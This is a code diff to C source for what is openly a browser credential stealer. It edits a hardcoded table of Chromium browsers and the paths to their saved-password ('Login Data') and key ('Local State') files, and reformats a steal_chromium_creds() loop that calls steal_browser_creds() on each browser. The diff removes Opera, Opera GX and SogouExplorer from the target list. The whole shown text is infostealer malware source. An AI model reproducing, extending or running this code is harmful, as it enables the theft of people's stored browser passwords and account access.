@@ -23,7 +23,8 @@
 
 // Hardcoded list of chromium browsers, taken from here:
 // https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_browsers.py
-// With Yandex removed as it needs special handling
+// With Opera, Opera GX, SogouExplorer and Yandex removed as they they need
+// special handling
 BrowserInfo browsers[] = {
     {L"7Star", L"\\7Star\\7Star\\User Data\\Default\\Login Data",
      L"\\7Star\\7Star\\User Data\\Local State"},
@@ -59,18 +60,10 @@ BrowserInfo browsers[] = {
      L"\\Google\\Chrome\\User Data\\Local State"},
     {L"Kometa", L"\\Kometa\\User Data\\Default\\Login Data",
      L"\\Kometa\\User Data\\Local State"},
-    {L"Opera", L"{APPDATA}\\Opera Software\\Opera Stable\\Default\\Login Data",
-     L"{APPDATA}\\Opera Software\\Opera Stable\\Local State"},
-    {L"Opera GX",
-     L"{APPDATA}\\Opera Software\\Opera GX Stable\\Default\\Login Data",
-     L"{APPDATA}\\Opera Software\\Opera GX Stable\\Local State"},
     {L"Orbitum", L"\\Orbitum\\User Data\\Default\\Login Data",
      L"\\Orbitum\\User Data\\Local State"},
     {L"QQBrowser", L"\\Tencent\\QQBrowser\\User Data\\Default\\Login Data",
      L"\\Tencent\\QQBrowser\\User Data\\Local State"},
-    {L"SogouExplorer",
-     L"{APPDATA}\\SogouExplorer\\Webkit\\User Data\\Default\\Login Data",
-     L"{APPDATA}\\SogouExplorer\\Webkit\\User Data\\Local State"},
     {L"Sputnik", L"\\Sputnik\\Sputnik\\User Data\\Default\\Login Data",
      L"\\Sputnik\\Sputnik\\User Data\\Local State"},
     {L"Torch", L"\\Torch\\User Data\\Default\\Login Data",
@@ -304,9 +297,10 @@ static int steal_browser_creds(BrowserInfo browser) {
 
 int steal_chromium_creds() {
   for (int i = 0; i < sizeof(browsers) / sizeof(BrowserInfo); i++) {
-   if(steal_browser_creds(browsers[i]) != EXIT_SUCCESS){
-    fwprintf(stderr, L"Unable to find credentials for %s. Continuing...\n", browsers[i].browserName);
-   }
+    if (steal_browser_creds(browsers[i]) != EXIT_SUCCESS) {
+      fwprintf(stderr, L"Unable to find credentials for %s. Continuing...\n",
+               browsers[i].browserName);
+    }
   }
 
   return EXIT_SUCCESS;
